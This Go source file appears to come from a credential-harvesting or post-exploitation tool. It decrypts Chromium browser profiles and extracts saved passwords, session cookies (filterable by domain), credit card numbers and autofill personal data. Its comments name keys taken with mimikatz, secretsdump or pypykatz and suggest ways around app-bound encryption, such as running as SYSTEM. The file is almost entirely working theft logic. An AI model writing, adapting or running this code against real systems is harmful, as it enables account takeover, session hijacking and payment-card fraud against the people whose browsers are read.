//go:build decrypt

package decrypt

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// externalChromiumKey is set when the caller provides the raw Chrome AES key
// directly (already DPAPI-decrypted). Bypasses all OS-specific key retrieval.
var externalChromiumKey []byte

// domainFilter, when non-empty, limits cookie extraction to cookies whose
// host_key contains this string (e.g. "google.com", ".office.com").
var domainFilter string

// SetExternalChromiumKey accepts the raw Chrome AES encryption key as a hex
// string. Use this when you already have the decrypted key from secretsdump,
// mimikatz, or pypykatz and want to decrypt a copied Chrome profile offline.
func SetExternalChromiumKey(hexKey string) error {
	k, err := hex.DecodeString(hexKey)
	if err != nil {
		return fmt.Errorf("invalid chrome-key hex: %w", err)
	}
	if len(k) != 16 && len(k) != 32 {
		return fmt.Errorf("chrome-key must be 16 or 32 bytes (got %d)", len(k))
	}
	externalChromiumKey = k
	return nil
}

// SetDomainFilter limits cookie extraction to cookies matching the given domain
// substring (e.g. "google.com"). Pass "" to disable filtering.
func SetDomainFilter(domain string) {
	domainFilter = strings.ToLower(domain)
}

// loginsOnly gates autofill/credit card extraction — when true, only saved
// passwords are extracted from Chromium profiles.
var loginsOnly bool

// SetLoginsOnly enables logins-only mode, skipping autofill and credit cards.
func SetLoginsOnly(v bool) { loginsOnly = v }

// getMasterKeyForProfile resolves the Chromium master key for a profile,
// preferring caller-supplied keys over OS-specific retrieval.
//
//   1. externalChromiumKey — caller provided raw AES key (highest priority)
//   2. dpapiMasterKey — caller provided DPAPI masterkey → derive Chrome key
//   3. getChromiumMasterKey — OS-specific (DPAPI/Keychain/libsecret)
func getMasterKeyForProfile(profileDir, browserName string) (*chromiumKeys, error) {
	if externalChromiumKey != nil {
		return &chromiumKeys{V10: externalChromiumKey}, nil
	}
	if dpapiMasterKey != nil {
		if key, err := deriveChromiumKeyFromDPAPIBlob(profileDir, dpapiMasterKey); err == nil {
			return &chromiumKeys{V10: key}, nil
		}
	}
	return getChromiumMasterKey(profileDir, browserName)
}

// localState is the JSON layout of the Chromium "Local State" file.
type localState struct {
	OSCrypt struct {
		EncryptedKey string `json:"encrypted_key"`
	} `json:"os_crypt"`
}

// readLocalStateKey returns the base64-decoded encrypted_key blob from the
// Local State file that lives one directory above the profile directory.
func readLocalStateKey(profileDir string) ([]byte, error) {
	lsPath := filepath.Join(filepath.Dir(profileDir), "Local State")
	data, err := os.ReadFile(lsPath)
	if err != nil {
		return nil, fmt.Errorf("%w: read Local State", err)
	}
	var ls localState
	if err := json.Unmarshal(data, &ls); err != nil {
		return nil, fmt.Errorf("%w: parse Local State", err)
	}
	if ls.OSCrypt.EncryptedKey == "" {
		return nil, fmt.Errorf("Local State has no os_crypt.encrypted_key")
	}
	raw, err := base64.StdEncoding.DecodeString(ls.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, fmt.Errorf("%w: base64 decode", err)
	}
	return raw, nil
}

// DecryptChromiumProfile decrypts saved passwords, cookies, credit cards
// and autofill data from a Chromium-family browser profile directory.
// The masterKey is obtained per-OS (DPAPI on Windows, libsecret/peanuts
// on Linux, Keychain on macOS).
func DecryptChromiumProfile(profileDir, browserName string) (result []DecryptedFinding, err error) {
	// Any panic inside the per-OS decrypt machinery (COM interop on
	// Windows in particular) must not take down the rest of the scan.
	defer func() {
		if r := recover(); r != nil {
			result = []DecryptedFinding{{
				Category:   "Browser",
				Type:       "decrypt_failed",
				File:       profileDir,
				Key:        browserName + " profile",
				Value:      fmt.Sprintf("(panic: %v)", r),
				Confidence: ConfMedium,
			}}
			err = nil
		}
	}()
	keys, err := getMasterKeyForProfile(profileDir, browserName)
	if err != nil {
		return []DecryptedFinding{{
			Category:   "Browser",
			Type:       "decrypt_failed",
			File:       profileDir,
			Key:        browserName + " master key",
			Value:      fmt.Sprintf("(could not unwrap key: %v)", err),
			Confidence: ConfMedium,
		}}, nil
	}

	var out []DecryptedFinding

	// Note which keys we ended up with.
	var keyMsg string
	switch {
	case keys.V10 != nil && keys.V20 != nil:
		keyMsg = "v10 + v20 (app-bound) — all Chrome passwords decryptable"
	case keys.V20 != nil:
		keyMsg = "v20 only (app-bound)"
	case keys.V10 != nil:
		keyMsg = "v10 only (v20 failed — IElevator blocked + Chrome not running for memory scan; try: run as SYSTEM, or use -chrome-key)"
	}
	out = append(out, DecryptedFinding{
		Category:   "Browser",
		Type:       "decrypt_keys",
		File:       profileDir,
		Key:        browserName + " master keys",
		Value:      keyMsg,
		Confidence: ConfLow,
	})

	// Saved logins
	if logins, err := decryptChromiumLogins(filepath.Join(profileDir, "Login Data"), keys, browserName); err == nil {
		out = append(out, logins...)
	}
	// Cookies
	if cookies, err := decryptChromiumCookies(filepath.Join(profileDir, "Network", "Cookies"), keys, browserName); err == nil {
		out = append(out, cookies...)
	} else if cookies, err := decryptChromiumCookies(filepath.Join(profileDir, "Cookies"), keys, browserName); err == nil {
		out = append(out, cookies...)
	}
	// Credit cards & autofill (skipped in logins-only mode)
	if !loginsOnly {
		if cards, err := decryptChromiumWebData(filepath.Join(profileDir, "Web Data"), keys, browserName); err == nil {
			out = append(out, cards...)
		}
	}

	if len(out) == 0 {
		out = append(out, DecryptedFinding{
			Category:   "Browser",
			Type:       "decrypted_empty",
			File:       profileDir,
			Key:        browserName,
			Value:      "(profile decrypted but no data extracted)",
			Confidence: ConfLow,
		})
	}
	return out, nil
}

func decryptChromiumLogins(dbPath string, keys *chromiumKeys, browser string) ([]DecryptedFinding, error) {
	if _, err := os.Stat(dbPath); err != nil {
		return nil, err
	}
	db, cleanup, err := openSQLiteCopy(dbPath)
	if err != nil {
		return nil, err
	}
	defer cleanup()

	rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var out []DecryptedFinding
	for rows.Next() {
		var url, user string
		var enc []byte
		if err := rows.Scan(&url, &user, &enc); err != nil {
			continue
		}
		pw, err := chromiumDecryptValue(enc, keys)
		if err != nil || len(pw) == 0 {
			continue
		}
		out = append(out, DecryptedFinding{
			Category:   "Browser",
			Type:       "saved_password",
			File:       dbPath,
			Key:        fmt.Sprintf("%s | %s | %s", browser, url, user),
			Value:      string(pw),
			Confidence: ConfHigh,
		})
	}
	return out, nil
}

func decryptChromiumCookies(dbPath string, keys *chromiumKeys, browser string) ([]DecryptedFinding, error) {
	if _, err := os.Stat(dbPath); err != nil {
		return nil, err
	}
	db, cleanup, err := openSQLiteCopy(dbPath)
	if err != nil {
		return nil, err
	}
	defer cleanup()

	rows, err := db.Query(`SELECT host_key, name, encrypted_value, expires_utc FROM cookies`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var out []DecryptedFinding
	for rows.Next() {
		var host, name string
		var enc []byte
		var expires int64
		if err := rows.Scan(&host, &name, &enc, &expires); err != nil {
			continue
		}
		if domainFilter != "" && !strings.Contains(strings.ToLower(host), domainFilter) {
			continue
		}
		val, err := chromiumDecryptValue(enc, keys)
		if err != nil || len(val) == 0 {
			continue
		}
		out = append(out, DecryptedFinding{
			Category:   "Browser",
			Type:       "cookie",
			File:       dbPath,
			Key:        fmt.Sprintf("%s | %s | %s | %d", browser, host, name, expires),
			Value:      truncateStr(string(val), 256),
			Confidence: ConfHigh,
		})
	}
	return out, nil
}

func decryptChromiumWebData(dbPath string, keys *chromiumKeys, browser string) ([]DecryptedFinding, error) {
	if _, err := os.Stat(dbPath); err != nil {
		return nil, err
	}
	db, cleanup, err := openSQLiteCopy(dbPath)
	if err != nil {
		return nil, err
	}
	defer cleanup()

	var out []DecryptedFinding

	// Credit cards
	if rows, err := db.Query(`SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards`); err == nil {
		for rows.Next() {
			var name string
			var month, year int
			var enc []byte
			if err := rows.Scan(&name, &month, &year, &enc); err != nil {
				continue
			}
			num, err := chromiumDecryptValue(enc, keys)
			if err != nil {
				continue
			}
			out = append(out, DecryptedFinding{
				Category:   "Browser",
				Type:       "credit_card",
				File:       dbPath,
				Key:        fmt.Sprintf("%s | %s (%02d/%d)", browser, name, month, year),
				Value:      string(num),
				Confidence: ConfHigh,
			})
		}
		rows.Close()
	}

	// Autofill (PII)
	if rows, err := db.Query(`SELECT name, value FROM autofill`); err == nil {
		for rows.Next() {
			var name, value string
			if err := rows.Scan(&name, &value); err != nil {
				continue
			}
			out = append(out, DecryptedFinding{
				Category:   "Browser",
				Type:       "autofill",
				File:       dbPath,
				Key:        browser + " | " + name,
				Value:      truncateStr(value, 200),
				Confidence: ConfMedium,
			})
		}
		rows.Close()
	}

	return out, nil
}

func truncateStr(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
